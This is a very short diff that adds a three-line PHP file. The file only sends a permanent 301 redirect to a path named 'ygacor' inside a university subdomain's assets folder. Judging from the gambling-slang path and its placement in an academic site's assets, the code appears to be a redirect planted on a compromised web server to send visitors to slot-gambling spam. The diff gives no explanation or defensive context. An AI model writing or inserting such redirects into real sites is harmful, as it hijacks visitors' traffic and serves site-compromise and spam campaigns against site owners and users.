@@ -1,0 +1,3 @@
+<?php
+
+header('Location: https://siap.dd.stikom-bali.ac.id/assets/ygacor/', true, 301);
